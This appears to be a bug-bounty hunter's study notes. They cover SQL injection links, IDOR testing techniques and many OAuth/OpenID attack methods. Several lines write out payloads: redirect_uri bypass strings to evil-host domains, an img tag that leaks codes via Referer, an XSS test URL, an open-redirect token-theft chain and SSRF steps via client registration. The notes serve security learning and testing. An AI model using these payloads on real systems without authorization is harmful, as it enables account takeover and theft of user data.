+[GSA Bounty disclosed on HackerOne: SQL injection in...](https://hackerone.com/reports/297478)
+
+https://securityonline.info/sql-injection-user-agent-injection-attack/
+
+[U.S. Dept Of Defense disclosed on HackerOne: [████] SQL Injections...](https://hackerone.com/reports/1018621)
+
+[How a YouTube Video lead to pwning a web application via SQL Injection worth $4324 bounty](https://infosecwriteups.com/how-a-youtube-video-lead-to-pwning-a-web-application-via-sql-injection-worth-4324-bounty-285f0a9b9f6c)
+
+[From SQL Injection to Shell](https://pentesterlab.com/exercises/from_sqli_to_shell/course)
+
+[GSA Bounty disclosed on HackerOne: SQL injection in...](https://hackerone.com/reports/297478)
+
+[How I Escalated a Time-Based SQL Injection to RCE](https://infosecwriteups.com/how-i-escalated-a-time-based-sql-injection-to-rce-bbf0d68cb398)
+
+[Out-of-Band (OOB) SQL Injection](https://infosecwriteups.com/out-of-band-oob-sql-injection-87b7c666548b)
+
+[SQL Injection & Remote Code Execution - Double P1](https://shahjerry33.medium.com/sql-injection-remote-code-execution-double-p1-6038ca88a2ec)
+
+[SQLi: Next Level](https://infosecwriteups.com/sqli-next-level-5b1145b83c79)
+
+[Healing blind injections](https://infosecwriteups.com/healing-blind-injections-df30b9e0e06f)
+
+select * from users where username = 'babyyyyyyy' and password = 'Iloveyou’;
+
+
+IDORS:
+[IDOR Techniques](https://www.xmind.net/m/CSKSWZ/)
+
+### Insecure Direct Object Reference (IDOR)
+
+An example of an IDOR bug is simply a url such as https://api.zseano.com/user/1
+which when queried will give you the information to the user id “1”. Changing it to
+user id “2” should give you an error and refuse to show you other users' details,
+however if they are vulnerable, then it will allow you to view that users details. In a
+nutshell, IDOR is about changing integer values (numbers) to another and seeing
+what happens. That’s the “explain like i’m 5”.
+Of course it isn’t always as simple as looking for just integer (1) values. 
+
+- Sometimes you will see a GUID (2b7498e3-9634-4667-b9ce-a8e81428641e) or another type of
+encrypted value. Brute forcing GUIDs is usually a dead-end so at this stage I will
+check for any leaks of this value.
+- I once had a bug where I could remove anyone's photo but I could not enumerate the GUID values. Visiting a users’ public profile and viewing the source revealed that the users photo GUID was saved with the file name (https://www.example.com/images/users/2b7498e3-9634-4667-b9ce-a8e81428641e/
+photo.png).
+- Has the value been leaked anywhere on the site, or perhaps it’s been indexed
+by Google? This is where I'd start looking for more keywords such as
+“appointment_id”, “appointmentID”.
+I had another case where I noticed the ID was generated using the same length &
+characters. At first me and another researcher enumerated as many combinations
+as possible but later realised we didn’t need to do that and we could just simply use
+an integer value. Lesson learnt: even if you see some type of encrypted value, just
+try an integer! The server may process it the same. Security through obscurity.
+You’d be surprised how many companies rely on obscurity.
+- When starting on a program I will hunt for IDORs specifically on mobile apps to
+begin with as most mobile apps will use some type of API and from past experience
+they are usually vulnerable to IDOR.
+- When querying for your profile information it will more than likely make a request to their API with just your user ID to identify who you are. However there is usually more to IDOR than meets the eye.
+- Imagine you have a website which allows you to upload private photos but you’ve discovered
+an IDOR which allows you to view any photo you wish. Think deeper and think, “If
+they aren’t checking that I own the ID I'm querying, what else have they forgotten to
+do certain permission checks on?”.
+- If you can sign up as various different roles (admin, guest), can you perform admin actions as a guest?
+- Can non paying members access paid features? IDORs are fun to find as sometimes you can discover the entire web app is broken.
+- As well as hunting for integer values I will also try simply injecting ID parameters.
+Anytime you see a request and the postdata is JSON, {"example":"example"}, try
+simply injecting a new parameter name, {"example":"example","id":"1"}. When the
+JSON is parsed server-side you literally have no idea how it may handle it, so why
+not try? This not only applies to JSON requests but all requests, but I typically have
+a higher success rate when it's a JSON payload. (look for PUT requests!)
+
+![Fe4IQxaX0AMuZfS.jpg](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/182c8b25-b97e-4164-a25e-730aa8bd1ee1/Fe4IQxaX0AMuZfS.jpg)
+
+### There are several types of IDOR attacks, including:
+
+- **Body Manipulation,** in which attackers modify the value of a checkbox, radio buttons, APIs, and form fields to access information from other users with ease.
+- **URL Tampering,** in which ****the URL is modified at the client’s end by tweaking the parameters in the HTTP request.
+- **HTTP Requests** in which IDOR vulnerabilities are typically found in GET, POST, PUT, and DELETE verbs.
+- **Mass Assignment**, where a record pattern can be abused to modify data that the user should not be able to access. While not always a result of IDOR vulnerabilities, there are many powerful examples of this being the result of it.
+
+```jsx
+Critical IDORs first
+Always look for IDORs in critical functionalities first. 
+Both write and read based IDORs can be of high impact.
+In terms of state-changing (write) IDORs, password reset, password change,
+account recovery IDORs often have the highest business impact.
+(Say, as compared to a “change email subscription settings” IDOR.)
+
+As for non-state-changing (read) IDORs, look for functionalities that handle 
+the sensitive information in the application. 
+For example, look for functionalities that handle direct messages, 
+sensitive user information, and private content. 
+Consider which functionalities on the application makes use of this information 
+and look for IDORs accordingly
+```
+
+IDOR Entry Points
+
+1-Profile URL’s or ID’s
+2-Password reset functions (great for privilege escalation)
+3-Numeric parameters
+4-Predictable parameters
+
+5-REST APIs 
+
+6-GET parameters 
+
+7-POST request bodies 
+
+8-graphQL endpoints
+
+9-PUT parameters 
+
+10-IDs in the request header 
+
+11-IDs in the cookies 
+
+12-Misc Query languages 
+
+13-test images for IDORs
+
+14- sometimes we find IDORs via changing request methods
+
+15-try to change username or email instead of IDs
+
+IDOR in Profile Picture
+
+1. Upload a picture and intercept the request.
+2. Now in the request we have parentuid as the parameter.
+3. Try to replace this value with different user.
+4. We can escalate this feature by mass assigning parentuid param.
+
+### Tips by vickie li
+
+- Do not ignore encoded and hashed IDs.also try to find patterns in different IDs.
+- **If you can’t guess it, try creating it**
+    - If the object reference IDs seem unpredictable, see if there is something you can do to manipulate the creation or linking process of these object IDs.
+- **Offer the application an ID, even if it doesn’t ask for it**
+    - If no IDs are used in the application generated request, try adding it to the request. Try appending *id, user_id, message_id* or other object reference params and see if it makes a difference to the application’s behavior.
+- HTTP parameter pollution can also ead to IDORs.
+
+it would look like this. If this request fails:
+
+```
+GET /api_v1/messages?user_id=ANOTHER_USERS_ID
+```
+
+Try this:
+
+```
+GET /api_v1/messages?user_id=YOUR_USER_ID&user_id=ANOTHER_USERS_ID
+```
+
+Or this:
+
+```
+GET /api_v1/messages?user_id=ANOTHER_USERS_ID&user_id=YOUR_USER_ID
+```
+
+Or provide the parameters as a list:
+
+```
+GET /api_v1/messages?user_ids[]=YOUR_USER_ID&user_ids[]=ANOTHER_USERS_ID
+```
+
+- **Blind IDORs:**Sometimes endpoints susceptible to IDOR don’t respond with the leaked information directly. They might lead the application to leak information elsewhere instead: in export files, emails and maybe even text alerts.
+- **Change the request method**
+    - If one request method doesn’t work, there are plenty of others that you can try instead: GET, POST, PUT, DELETE, PATCH…
+    A common trick that works is substituting POST for PUT or vice versa: the same access controls might not have been implemented!
+    - **Change the requested file type**
+        - Sometimes, switching around the file type of the requested file may lead to the server processing authorization differently. For example, try adding .json to the end of the request URL and see what happens.
+    - Test:
+        - query component
+        - post variables
+        - cookies
+- you can also look for only parametrized requests in the burpsuite (proxy —> show only parametrized requests)
+
+### Useful extensions
+
+- authorize
+    
+    This is what the statuses for (2) mean:
+    
+    ENFORCED: This means there is no IDOR. The modified request returns a 403 forbidden or any other error code.
+    
+    Is Enforced?: This means the modified the modified response did not return an error code, but not the exact same response as the unauthenticated request
+    
+    Bypassed: THIS DOES NOT AUTOMATICALLY GUARANTEE AN IDOR! This means that the modified response matches the original response. You still have to confirm whether or not this is intended behavior. More often than not, it will be intended behaviour. Whether or not it is, is up to your discretion and this is also part of the reason why i recommend you really know your target well by exploring it before you hack. Always confirm this manually by
+    
+    1. Right clicking the request
+    2. Sending the modified request to the repeater
+    3. Repeating the request and confirming you are seeing other peoples data that is not supposed to be public
+- match and replace
+
+### Articles/write-ups/reports
+
+[$$$$ IDOR’s — How to find IDORs in Ecommerce sites?](https://junoonbro.medium.com/idors-how-to-find-idors-in-ecommerce-sites-d112bd946fcf)
+
+⇒ Must read
+
+[How to find more IDORs](https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489)
+
+[IDORs: What are they and how do you test for them?](https://thexssrat.medium.com/idors-what-are-they-and-how-do-you-test-for-them-885c9df4af36)
+
+[What I learnt from reading 220* IDOR bug reports.](https://medium.com/@Sm9l/what-i-learnt-from-reading-220-idor-bug-reports-6efbea44db7)
+
+[14 Recon Phases for Mastering Bug Bounty Hunting](https://medium.com/@Land2Cyber/14-recon-phases-for-mastering-bug-bounty-hunting-448672522968)
+
+[IDOR Checklist](https://medium.com/@Az3m/idor-checklist-c66133d0802b)
+
+
+OAuth —> `Open standard authorization`
+
+- Basically, it allows third party services to exchange your information without having to give away your password.
+
+**Uses of OAuth:**
+
+- logins
+- uses by enterprises for SSO
+
+**OAuth1.0** 
+
+- also sometimes used for resource sharing like importing contacts, images etc, from one application to another.
+
+### Difference Between OAuth1.0 and OAuth2.0
+
+- `Transport-independent` : security is not delegated to http/TLS.
+- **Founded in cryptography**, specially digital signatures
+    
+    →Digital signatures are used to prove the integrity and authenticity of the message. Digital signatures can ensure that a certain message was sent from a specific source and that the message and the signature cannot be tampered with or copied to another source, but client side implementations can be especially complex.
+    
+- **Message are each individually cryptographically assigned**
+    
+    →if a single message within the communication is constructed or signed improperly, the entire transaction will be invalid.
+    
+- **Basic signature workflow**
+    1. Client application registers with provider, such as twitter.
+    2. Twitter provide client with a ‘custom secret’ unique to that app.
+    3. Client application signs all OAuth requests to twitter with its unique ‘Custom secret’.
+    4. If any of the OAuth request is malformed, missing data or signed improperly, the request will be rejected.
+
+### OAuth2.0
+
+- `Transport-dependent`:Mostly security defenses are delighted to HTTPS/TLS. A type, an improper TLS configuration, a failure to properly validate a certificate or vulnerabilities in an underlying library can lead to `MITM attack`, compromising all OAuth communication.
+- `Centered around bearer token` : They are easy for integration, but not great for security.
+
+—>Bearer token **do not provide internal security mechanisms**.
+
+—>**They can be copied or stolen** but are easier to implement.
+
+- Much easier to work with but `more difficult to built securely`
+- `Much more flexible`:because it considers non-web clients as well.
+- `Better separation of duties`:Handling resource requests and handling user authentication can be decompiled in OAuth2.0
+- **Basic signature workflow**
+    1. Client application registers with provider, such as twitter.
+    2. Twitter provide client with a ‘client secret’ unique to that application.
+    3. Client application include ‘client secret’ with every request.
+    4. If any of OAuth request is malformed, missing data or contains the wrong secret, the request will be rejected.
+    
+    →In simple words, OAuth allow the users to grant access to the application without exposing their login credentials to the requesting application.
+    
+
+**What is OAuth Grant Type?**
+
+- OAuth grant types determines the exact sequence of steps that are involved in OAuth process.
+- The grant type also affects how the client application communicates with OAuth service at each stage, include how access token itself is sent.
+- For a reason, grant types are often referred to as ‘**`OAuth flows`'**.
+
+**OAuth Scopes**
+
+- For OAuth grant type, the client application has to specify which data it want to access and what kind of operations it wants to perform. It does this using the **`SCOPE`**parameter of authorization request it sends to the OAuth service.
+
+`Example`:scope=contacts, scope=contacts.read
+
+### What is OpenID? (OCID)
+
+→OpenID connect is an open authentication protocol that profiles and extends OAuth2.0 to add on identity layer.
+
+→OCID allows clients to confirm an end user’s identity using authentication by an authorization server.
+
+→Implementing OCID on top of OAuth2.0 creates a single framework that promises to secure APIs, mobile native applications and browser applications in a single, cohesive architecture.
+
+**OpenID connect Rules**
+
+Almost same as OAuth. The main difference is that the specification uses slightly different technology.
+
+- `Relying party` :The application that is requesting authentication of a user. That is synonymous with the OAuth client application.
+- `End User`:The user who is being authenticated. This is of a user. This is synonymous with the OAuth resource owner.
+- `OpenAI provider`:An Oauth service that is configured to support OpenAI connect.
+
+**OpenID connect Calms and Scopes**
+
+→The term calms refers to `key:value` pairs that represent information about the user on the resource server.
+
+example: `“familyname”:”montoya”` 
+
+→In order to use  OpenID connect, the client application must specify the scope `OpenID` in the authorization request. They can include one or more of the other standard scope like: `profile`, `email`, `address`, `phone`.Each of those scopes corresponds to read access for a subnet of calms about user that are defined in the OpenID specification. 
+
+**ID token**
+
+- The other main addition provided by OpenID Connect is the `id-token` response type.This returns a JSON web token`(JWT)` with a JSON web signature `(JWS)`.The JWT payload contains a list of calms based on the scope that was initially requested.
+- It also contains info about how and when the user was last authenticated by OAuth service.
+- The client application can use this to decide whether or not the user has been sufficiently authenticated.
+- The main benefit of User `id-token` is the reduced number of requests that needed to be sent b/w the client and application and OAuth service, which could provide better performance overall.
+
+**Identify OpenID connect**
+
+If OpenID connect is actively used by the client application, this should be obvious from authentication request.
+
+The most full proof way to check is to look for the mandatory OpenID scope.
+
+Even if the login process does not initially appear to be using OpenID connect, it is `still worth checking` whether the OAuth service support it. `You can simply try adding the OpenID scope or changing the response type to id-token` and `observing whether this results in an error.`
+
+### **Entities and terms used in OAuth 2.0 flow**
+
+- **resource owner**: The `resource owner` is the **user/entity** granting access to their protected resource, such as their Twitter account Tweets. In this example, this would be **you**.
+- **resource server**: The `resource server` is the **server handling authenticated requests** after the application has obtained an `access token` on behalf of the `resource owner` . In this example, this would be **https://twitter.com**
+- **client application**: The `client application` is the **application requesting authorization** from the `resource owner`. In this example, this would be **https://yourtweetreader.com**.
+- **authorization server**: The `authorization server` is the **server issuing `access tokens`** to the `client application` **after successfully authenticating** the `resource owner` and obtaining authorization. In the above example, this would be **https://twitter.com**
+- **client_id**: The `client_id` is the **identifier for the application**. This is a public, **non-secret** unique identifier.
+- **client_secret:** The `client_secret` is a **secret known only to the application and the authorization server**. This is used to generate `access_tokens`
+- **response_type**: The `response_type` is a value to detail **which type of token** is being requested, such as `code`
+- **scope**: The `scope` is the **requested level of access** the `client application` is requesting from the `resource owner`
+- **redirect_uri**: The `redirect_uri` is the **URL the user is redirected to after the authorization is complete**. This usually must match the redirect URL that you have previously registered with the service
+- **state**: The `state` parameter can **persist data between the user being directed to the authorization server and back again**. It’s important that this is a unique value as it serves as a **CSRF protection mechanism** if it contains a unique or random value per request
+- **grant_type**: The `grant_type` parameter explains **what the grant type is**, and which token is going to be returned
+- **code**: This `code` is the authorization code received from the `authorization server` which will be in the query string parameter “code” in this request. This code is used in conjunction with the `client_id` and `client_secret` by the client application to fetch an `access_token`
+- **access_token**: The `access_token` is the **token that the client application uses to make API requests** on behalf of a `resource owner`
+- **refresh_token**: The `refresh_token` allows an application to **obtain a new `access_token` without prompting the user**
+
+**The OAuth framework specifies several grant types for different use cases, as well as a framework for creating new grant types like:**
+
+- `Authorization code` : for mobile and web-apps
+- `Implicit code` :historically used for single-page JavaScript apps where secrets cannot be securely stored
+- `Resource-owner password credentials` : for logging in with username and password
+- PKCE
+- `Client Credentials` : enables the client to obtain an access token by accessing their own resources
+- `Device Code`
+- `Refresh Token`
+
+→`authorization code grant` and `implicit grant` are most common grants
+
+### **Authorization Code flow for OAuth**
+
+![image5.webp](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f9ef82fc-8aff-49bb-b4b8-c321ac618901/image5.webp)
+
+- Instead of requesting tokens directly from your API, the Authorization Code flow protects a client secret by redirecting a request for a token through an Authorization Server.
+- The Authorization Server authenticates a user and approves their access to a resource by providing a temporary authorization code. A token can then be requested using your credentials along with this authorization code.
+- The authorization code offers an additional layer of security. However, this grant requires sending the client secret to request the access token. The OAuth service provider can then verify the request is coming from a legitimate client, instead of an attacker who has intercepted the authorization code.
+
+### **Implicit flow for OAuth**
+
+![image1.webp](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/18ab900c-3342-4fa3-a9ad-d1415e036c56/image1.webp)
+
+- The Implicit grant was previously recommended for native and browser-based applications, whose client secrets cannot be revealed on the frontend:
+- Native mobile apps, whose client secrets cannot be securely stored since decompiling the                                app will reveal them
+- Browser-based apps, like single-page apps (SPAs), whose client secrets cannot be securely      stored because the app’s source code is available to the browser
+- For these scenarios, the [`Implicit grant`](https://tools.ietf.org/html/rfc6749#section-1.3.2) is a simplified Authorization Code flow that directly issues an access token without authenticating the client.
+
+**Difference between authorization code grant and implicit grant**
+
+**authorization code grant**
+
+**Implicit grant**
+
+- Application exchanges auth code for an access token
+
+- Application directly receives an access token
+
+### **PKCE:Proof Key for Code Exchange**
+
+- PKCE is an extension to the [`Authorization Code flow`](https://oauth.net/2/grant-types/authorization-code/) to prevent CSRF and authorization code injection attacks.
+- PKCE was originally designed to protect the authorization code flow in mobile apps, but its ability to prevent authorization code injection makes it useful for every type of OAuth client, even web apps that use a client secret.
+
+The PKCE-enhanced Authorization Code Flow builds upon the [**standard Authorization Code Flow**](https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow), the steps are very similar.
+
+we saw another layer of security for OAuth public clients using the following elements:
+
+- **Code verifier:** a cryptographically random string used to correlate the authorization request to the token request
+- **Code challenge:** derived from the code verifier sent in the authorization request, to be verified against later
+- **Code challenge method:** what was used to derive code challenge
+
+![image6.webp](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9e7233dd-751a-4a1c-8dd3-a16ebd7fa15d/image6.webp)
+
+### OAuth Recon
+
+- Doing some basic recon of OAuth service being used can point you in the right direction when it comes to identify vulnerability.
+1. If the external service is used, you should be able to identify the specific provider from the hostname to which authorization request is sent.
+2. As these service provide public API, there is often `detailed documentation` available that should tell you all kind of useful information, such as exact name of the endpoints and which configuration option are being used
+3. Once you know the hostname, you should always `try sending a GET request to the following standard endpoints`:
+
+→ `/.well-known/oauth-authorization-server`
+
+→ `/.well-known/openid-configuration`
+
+- this will often return a JSON configuration file containing key info, such as detail of additional features that may be supportive.
+- this will sometimes tip you about wider attack surface and supportive features that may not be mentioned in the documentation.
+
+## Checklist
+
+![oauth.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/734c3c20-5f5e-4929-a7be-e64d37f002e6/oauth.png)
+
+## **Issues**
+
+### **Improper implementation of implicit grand type**
+
+- Once the OAuth provider send the access token to the client application, application has to maintain the session. To achieve this,the client application will often submit this data to the server in the POST request and then assign the user a session cookie, effectively login them in similar to traditional password based login.
+- However the server does not have any  secret or password to compare with the data submitted by client application. which means it is implicitly trusted.
+- In this situation `hacker can simply change the email/username` parameters and send them to the server to impersonate any user as access token is valid.
+
+[Lab: Authentication bypass via OAuth implicit flow | Web Security Academy](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
+
+### **Flawed CSRF protection**
+
+- As you know that the `state` parameter server as a CSRF token from the client application.
+- If the `client application does not send the state parameter`  then it is extremely interesting from an attacker’s prospective.
+- It means that they can initiate an OAuth flaw themselves before tricking a User’s browser into completing it.
+- you can also try to remove state parameter completely.
+
+steps:
+
+1. login normally
+2. capture the OAuth request and observe.
+3. If the state parameter is missing then craft an IFrame to perform CSRF attack.
+4. account takeover achieved successfully.
+
+[Lab: Forced OAuth profile linking | Web Security Academy](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
+
+[ctf-writeups/notes_surfer.md at master · gr455/ctf-writeups](https://github.com/gr455/ctf-writeups/blob/master/hacktivity20/notes_surfer.md)
+
+### **`redirect_uri` parameter not validated**
+
+- When the redirect_uri is not checked properly by the OAuth provider, it is possible for an attacker to steal authorization codes associated with other user’s accounts. The code or access tokens can be redirected to attacker’s control website and can be use for further completion of the flaw.
+- sometimes you have to bypass the flaw like
+    - https://expected-host@evil-host
+    - http://evil-host#expected-host
+    - http://default-host.com &@foo.evil-user.net#@bar.evil-user.net
+    - you can also try to combine it with xss you found on any subdomain of the target.
+    
+
+[GSA Bounty disclosed on HackerOne: Stealing Users OAuth Tokens...](https://hackerone.com/reports/665651)
+
+[BOHEMIA INTERACTIVE a.s. disclosed on HackerOne: Stealing Users...](https://hackerone.com/reports/405100)
+
+[Rockstar Games disclosed on HackerOne: Smuggle SocialClub's...](https://hackerone.com/reports/342709)
+
+[Lab: OAuth account hijacking via redirect_uri | Web Security Academy](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
+
+In addition to open redirects, you should look for any other vulnerabilities that allow you to extract the code or token and send it to an external domain. Some good examples include:
+
+- **Dangerous JavaScript that handles query parameters and URL fragments:** For example, insecure web messaging scripts can be great for this. In some scenarios, you may have to identify a longer gadget chain that allows you to pass the token through a series of scripts before eventually leaking it to your external domain.
+- [**XSS](https://portswigger.net/web-security/cross-site-scripting) vulnerabilities:** Although XSS attacks can have a huge impact on their own, there is typically a small time frame in which the attacker has access to the user's session before they close the tab or navigate away. As the `HTTPOnly` attribute is commonly used for session cookies, an attacker will often also be unable to access them directly using XSS. However, by stealing an OAuth code or token, the attacker can gain access to the user's account in their own browser. This gives them much more time to explore the user's data and perform harmful actions, significantly increasing the severity of the XSS vulnerability.
+
+[Exploiting OAuth: Journey to Account Takeover](https://blog.dixitaditya.com/oauth-account-takeover)
+
+- **HTML injection vulnerabilities:** In cases where you cannot inject JavaScript (for example, due to [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) constraints or strict filtering), you may still be able to use a simple HTML injection to steal authorization codes. If you can point the `redirect_uri` parameter to a page on which you can inject your own HTML content, you might be able to leak the code via the `Referer` header. For example, consider the following `img` element: `<img src="evil-user.net">`. When attempting to fetch this image, some browsers (such as Firefox) will send the full URL in the `Referer` header of the request, including the query string.
+
+[Lab: Stealing OAuth access tokens via a proxy page | Web Security Academy](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
+
+- Can also lead to **path traversal**, **weak redirect_uri regexes**, **stealing token via referer header**
+
+**Other parameters that can be vulnerable to Open Redirects are:**
+
+- **`client_uri`** - URL of the home page of the client application
+- **`policy_uri`** - URL that the Relying Party client application provides so that the end user can read about how their profile data will be used.
+- **`tos_uri`** - URL that the Relying Party client provides so that the end user can read about the Relying Party's terms of service.
+- **`initiate_login_uri`** - URI using the https scheme that a third party can use to initiate a login by the RP. Also should be used for client-side redirection.
+
+> All these parameters are **optional according to the OAuth and OpenID** specifications and not always supported on a particular server, so it's always worth identifying which parameters are supported on your server.
+> 
+
+### **Parameter pollution**
+
+ex:- [http://oauth-authorization-server.com/?client_id=123&`redirect_uri`=client-app.com/callback&`redirect_uri`=evil-user.net](http://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net)  
+
+- attacker can try [localhost](http://localhost) URIs as they are often used during development. you can bypass validation like:  `localhost.evil-user.net`
+
+### Homograph attack
+
+- Try to test redirect_uri with homograph attack.
+
+[Semrush disclosed on HackerOne: OAuth `redirect_uri` bypass using...](https://hackerone.com/reports/861940)
+
+### **Account Squatting**
+
+- When apps give users an option to create accounts via an email as well as login using social media, they miss checking if a previous account was created with the same email.
+- This allows an attacker to create a "backdoor” account to access the victim's details.
+
+**`Steps`:**
+
+- An attacker can register with the email address of the victim.
+
+`Note`: This attack will not work if the app has email verification or you can bypass the email verification 
+
+- Next, the victim logs in using Google/FB with the same email address.
+- The previously created account & the victim's legitimate account are then tied to the same account
+
+### **Reusing access token**
+
+- The application/client may fail to expire used tokens.
+- If the URL with the access token is leaked, then an attacker may be able to reuse the token.
+- This can lead to a full account takeover. Or at the minimum, it will leak the user's personal details.
+
+[Reverb.com disclosed on HackerOne: Full account takeover](https://hackerone.com/reports/314808)
+
+### **XSS in redirect implementation**
+
+it might be possible that the redirect **URL is being reflected in the response**
+ of the server after the user authenticates, being **vulnerable to XSS**. Possible payload to test:
+
+```jsx
+https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
+```
+
+### Flow hijack through open-redirect onclick
+
+- Lets say that the allowed domain for the redirect_uri is [`https://xyz.com`](https://xyz.com) in the application’s configuration, and we have an open redirect on `https://xyz.com;` then we can effectively steal access token by using the redirect to attacker’s domain file to grab the token.
+
+`example`:
+
+```jsx
+redirect_uri=https://xyz.com/exit/redirect.php?u=https://abhilov.com/roken/callback
+```
+
+### Redirect_uri validation on authorization code grant or implicit grant
+
+(Vuln of this type can also exist even if the server handles the wildcard properly
+
+For Ex: Suppose if the client register the redirect_uri pattern `“http://*.somesite.example/*”` and authorization server interprets this as allow redirect_uri pointing to any host residing in the domain `“somesite.example”`. 
+
+Then, if the attacker can manage establish a host on subdomain in `“somesite.example”` then he can perform attack.
+
+you can try :  `subdomain takeover + OAuth 2.0`
+
+### Naked domain
+
+- It means that the redirect_uri is a naked domain, means that the subdomain is not specified.
+- ex: `[xyz`.example.com/token](http://xyz.example.com/token)
+- [`abc`.example.com/token](http://abc.example.com/token)
+
+### Directory traversal tricks
+
+- Directory traversal tricks assume that we can save certain files of our choice under tie allowed domain;This case is common in web-application which allow uploading of file and so on.
+- It utilize different methods such as percent encoding, double percent encoding and CSRF characters to fool the authorization server into accepting the specified redirect_uri.
+
+### TLD suffix confusion
+
+- We can bypass checks if the top-level domain is specified.we can bypass redirect_uri with a .com TLD by replacing it with a suffix such as .com.mx , .com.br etc.
+
+original
+
+suffixed
+
+[example.com/token](http://example.com/token) 
+
+[example.com.mx/token](http://example.com.mx/token) 
+
+[example.org/token](http://example.org/token) 
+
+[example.com.in/token](http://example.com.in/token) 
+
+### Authorization code injection
+
+- In the authorization code injection attack, the attacker attempts to inject a stolen authorization code into attack’s own session with the client. The aim is to associate the attacker’s session  at the client with victim’s resource or identity.
+
+### Access token injection
+
+- In the access token attack, the attacker attempts to inject a stolen access token into  a legitimate client. This will typically happen if the attacker wants to utilize a leaked access token to impersonate a user in a certain client.
+- To conduct a attack, the attacker tart a OAuth flow with the client using the implicit grant and modifies the authorization response by replacing access token issued by the authorization server response including the leaked access token.
+- Since the response includes the “state” value granted by client for the particular transaction, the client does not treat the response as a CSRF attack and uses the access token injected by the attacker.
+
+### Flowed scope validation
+
+- every time when user login to  authorization server, they will be presented with a list of data that the client application want to access. (`like email, profile picture`).
+- with the `authorization code grant`, the user’s data is requested and send via secure server-to-server communication.For attacker it is impossible to manipulate directly. However attacker can register their own client application with the OAuth service.
+- For the `implicit grant type`, the access token is sent via the browser. Attacker can steal tokens and use them directly by sending a normal browser-based request to the OAuth endpoint, manually adding a new scope parameter in process.
+
+### Unverified User registration
+
+- Some websites that provide an OAuth service allow users to register an account without verifying all of their details, including their addresses.
+- Attacker can exploit this by registering an account with OAuth provider using the same detail as a target user, such as known email address and sign in as victim via this fraudulent account with OAuth provider.
+
+### Host-Header injection
+
+- if the host-header is not being validated at the server, there is a possibility to redirect the token to malicious host via host-header injection.
+
+### Reusable OAuth token
+
+- the token should expire from backend once user logs out from the application similar to traditional session management functionality. If it is not the case it can be considered under bad security practices and can be exploited.
+
+### SSRF in OAuth
+
+One of the hidden URLs that you may miss is the **Dynamic Client Registration endpoint**. In order to successfully authenticate users, OAuth servers need to know details about the client application, such as the "client_name", "client_secret", "redirect_uris", and so on. These details can be provided via local configuration, but OAuth authorization servers may also have a **special registration endpoint**. This endpoint is normally mapped to "/register" and accepts POST requests with the following format:
+
+```jsx
+POST /connect/register HTTP/1.1
+Content-Type: application/json
+Host: server.example.com
+Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJ ...
+
+{
+ "application_type": "web",
+ "redirect_uris": ["https://client.example.org/callback"],
+ "client_name": "My Example",
+ "logo_uri": "https://client.example.org/logo.png",
+ "subject_type": "pairwise",
+ "sector_identifier_uri": "https://example.org/rdrct_uris.json",
+ "token_endpoint_auth_method": "client_secret_basic",
+ "jwks_uri": "https://client.example.org/public_keys.jwks",
+ "contacts": ["ve7jtb@example.org"],
+ "request_uris": ["https://client.example.org/rf.txt"]
+}
+```
+
+There are two specifications that define parameters in this request: [RFC7591](https://tools.ietf.org/html/rfc7591) for OAuth and [Openid Connect Registration 1.0](https://openid.net/specs/openid-connect-registration-1_0.html#rfc.section.3.1).
+
+As you can see here, a number of these values are passed in via URL references and look like potential targets for [Server Side Request Forgery](https://portswigger.net/web-security/ssrf). At the same time, most servers we've tested do not resolve these URLs immediately when they receive a registration request. Instead, they just **save these parameters and use them later during the OAuth authorization flow**. In other words, this is more like a second-order SSRF, which makes black-box detection harder.
+
+### **The following parameters are particularly interesting for SSRF attacks:**
+
+- **logo_uri** - URL that references a **logo for the client application**. **After you register a client**, you can try to call the OAuth authorization endpoint ("/authorize") using your new "client_id". After the login, the server will ask you to approve the request and **may display the image from the "logo_uri"**. If the **server fetches the image by itself**, the SSRF should be triggered by this step. Alternatively, the server may just include the logo via a **client-side "<img>" tag**. Although this doesn't lead to SSRF, it may lead to **XSS if the URL is not escaped**.
+- **jwks_uri** - URL for the client's JSON Web Key Set [JWK] document. This key set is needed on the server for validating signed requests made to the token endpoint when using JWTs for client authentication [RFC7523]. In order to test for SSRF in this parameter, **register a new client application with a malicious "jwks_uri"**, perform the authorization process to **obtain an authorization code for any user, and then fetch the "/token" endpoint** with the following body:`POST /oauth/token HTTP/1.1...`
+``
+`grant_type=authorization_code&code=n0esc3NRze7LTCu7iYzS6a5acc3f0ogp4&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=eyJhbGci...`If vulnerable, the **server should perform a server-to-server HTTP request to the supplied "jwks_uri"** because it needs this key to check the validity of the "client_assertion" parameter in your request. This will probably only be a **blind SSRF vulnerability though**, as the server expects a proper JSON response.
+- **sector_identifier_uri** - This URL references a file with a single **JSON array of redirect_uri values**. If supported, the server may **fetch this value as soon as you submit the dynamic registration request**. If this is not fetched immediately, try to perform authorization for this client on the server. As it needs to know the redirect_uris in order to complete the authorization flow, this will force the server to make a request to your malicious sector_identifier_uri.
